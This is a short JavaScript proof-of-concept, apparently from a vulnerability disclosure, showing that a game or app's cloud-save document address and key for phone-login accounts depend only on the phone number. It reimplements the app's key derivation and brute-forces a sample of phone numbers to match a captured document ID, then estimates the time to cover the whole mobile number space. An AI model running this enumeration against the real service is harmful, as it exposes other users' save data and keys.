/* Offline PoC: the hansen_saves address for a phone-login account is a pure function of the phone number.
 * Reproduces the app's (non-secret) key/doc derivation and brute-forces the phone space to match a
 * world-readable docId captured from the emulator. Prints only match + rate (no key material). */
import crypto from 'node:crypto';
const ALPHABET = '0123456789ABCDEFGHJKMNPQRSTVWXYZ';           // hansen_cloud_save ALPHABET
function keyFromUid(uid) {                                      // == hansen_cloud_save_v965.js keyFromUid
  let h1 = 0x811c9dc5, h2 = 0x01000193, s = 'HSNACCT:' + uid;
  for (let i = 0; i < s.length; i++) { h1 = ((h1 ^ s.charCodeAt(i)) >>> 0) * 16777619 >>> 0; h2 = ((h2 + s.charCodeAt(i) * (i + 7)) >>> 0) * 2654435761 >>> 0; }
  let out = '';
  for (let j = 0; j < 16; j++) { h1 = (h1 * 1664525 + 1013904223) >>> 0; h2 = (h2 ^ (h1 >>> 13)) >>> 0; out += ALPHABET.charAt(((h1 ^ h2) >>> 0) % ALPHABET.length); }
  return out;                                                   // normalizeKey() only strips the hyphens -> these 16 chars
}
const docIdOf = (saveKey) => crypto.createHash('sha256').update('hansen-doc-v1:' + saveKey).digest('hex');
const TARGET = '09b6948cb8995614e34b0bfbf97f107fff8ff3459aa38a2f5156613498861248'; // captured, phone 13800138077

// brute-force the '138****8077' slice (10^4) as a timed sample, then extrapolate to the real mobile space
let matched = null; const t0 = Date.now(); let n = 0;
for (let mid = 0; mid < 10000; mid++) {
  const phone = '138' + String(mid).padStart(4, '0') + '8077';
  n++;
  if (docIdOf(keyFromUid('p:' + phone)) === TARGET) { matched = phone; break; }
}
const dt = (Date.now() - t0) / 1000, rate = Math.round(n / dt);
console.log('matched phone =', matched, ' (tried', n, 'in', dt.toFixed(2), 's,', rate, 'hash/s single-thread node)');
console.log('China mobile space ~1.8e9 numbers => ~', Math.round(1.8e9 / rate / 60), 'min single-thread;',
            Math.round(1.8e9 / rate / 3600 / 2000 * 60), 's on a 2000x GPU. Address+AES key depend ONLY on the phone.');
